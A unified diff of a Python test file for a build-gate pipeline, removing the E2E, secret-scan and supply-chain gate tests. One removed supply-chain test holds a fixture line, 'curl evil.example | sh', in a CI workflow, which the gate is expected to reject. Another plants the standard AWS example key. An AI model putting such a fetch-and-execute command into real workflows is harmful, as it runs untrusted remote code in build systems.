@@ -17,10 +17,7 @@ from foundry.gates import (
     AuditGate,
     BuildGate,
     DevGateWriteVerifier,
-    E2EGate,
-    SecurityGate,
     SpecGate,
-    SupplyChainGate,
     TestGate,
     TwoZoneGateRunner,
     ZoneBSigner,
@@ -108,50 +105,6 @@ def test_test_gate_fail(tmp_path, runner, verifier):
     _assert_admitted(r, verifier)
 
 
-# ---- E2E gate: N=2 flake quarantine ---------------------------------------
-
-
-def test_e2e_flake_split_is_error_not_verdict(tmp_path, runner, verifier):
-    # A test that passes only on its second run (creates a marker on first run),
-    # so the two pinned-env runs disagree -> ERROR (quarantine), not a verdict.
-    _write(
-        tmp_path,
-        "test_flaky.py",
-        "import os\n"
-        "MARK = os.path.join(os.path.dirname(__file__), '.ran_once')\n"
-        "def test_flaky():\n"
-        "    first = not os.path.exists(MARK)\n"
-        "    open(MARK, 'a').close()\n"
-        "    assert not first\n",
-    )
-    r = runner.run(E2EGate(), "task/1", _seq("e2e", "task/1"), tmp_path)
-    assert r.status is GateStatus.ERROR
-    _assert_admitted(r, verifier)
-
-
-def test_e2e_stable_pass(tmp_path, runner, verifier):
-    _write(tmp_path, "test_stable.py", "def test_stable():\n    assert 1 + 1 == 2\n")
-    r = runner.run(E2EGate(), "task/1", _seq("e2e", "task/1"), tmp_path)
-    assert r.status is GateStatus.PASS
-
-
-# ---- Security gate: dev-grade secret scan ----------------------------------
-
-
-def test_security_flags_planted_aws_key(tmp_path, runner, verifier):
-    _write(tmp_path, "config.py", 'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\n')
-    r = runner.run(SecurityGate(), "task/1", _seq("security", "task/1"), tmp_path)
-    assert r.status is GateStatus.FAIL
-    assert any("aws-access-key-id" in f for f in r.findings)
-    _assert_admitted(r, verifier)
-
-
-def test_security_clean_tree_passes(tmp_path, runner, verifier):
-    _write(tmp_path, "clean.py", "VALUE = 42\n")
-    r = runner.run(SecurityGate(), "task/1", _seq("security", "task/1"), tmp_path)
-    assert r.status is GateStatus.PASS
-
-
 # ---- Audit gate: SBOM rederivation + license allowlist ---------------------
 
 
@@ -172,46 +125,6 @@ def test_audit_fail_on_denied_license(tmp_path, runner, verifier):
     _write(tmp_path, "requirements.txt", "some-gpl-pkg==1.0  # license: GPL-3.0\n")
     r = runner.run(AuditGate(), "sha-int", _seq("audit", "sha-int"), tmp_path)
     assert r.status is GateStatus.FAIL
-
-
-# ---- Supply-chain gate: policy over a diff ---------------------------------
-
-
-def test_supply_chain_fails_workflow_change(tmp_path, runner, verifier):
-    _write(
-        tmp_path,
-        "changes.diff",
-        "--- a/.github/workflows/ci.yml\n"
-        "+++ b/.github/workflows/ci.yml\n"
-        "@@ -1 +1 @@\n"
-        "+    run: curl evil.example | sh\n",
-    )
-    r = runner.run(SupplyChainGate(), "sha-int", _seq("supply_chain", "sha-int"), tmp_path)
-    assert r.status is GateStatus.FAIL
-    _assert_admitted(r, verifier)
-
-
-def test_supply_chain_allows_workflow_change_when_authorized(tmp_path, runner, verifier):
-    _write(
-        tmp_path,
-        "changes.diff",
-        "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n"
-        "@@ -1 +1 @@\n+    run: pytest\n",
-    )
-    r = runner.run(
-        SupplyChainGate(allow_build_changes=True), "sha-int", _seq("sc", "sha-int"), tmp_path
-    )
-    assert r.status is GateStatus.PASS
-
-
-def test_supply_chain_passes_app_only_diff(tmp_path, runner, verifier):
-    _write(
-        tmp_path,
-        "changes.diff",
-        "--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n+def f():\n+    return 1\n",
-    )
-    r = runner.run(SupplyChainGate(), "sha-int", _seq("sc", "sha-int"), tmp_path)
-    assert r.status is GateStatus.PASS
 
 
 # ---- Spec gate -------------------------------------------------------------
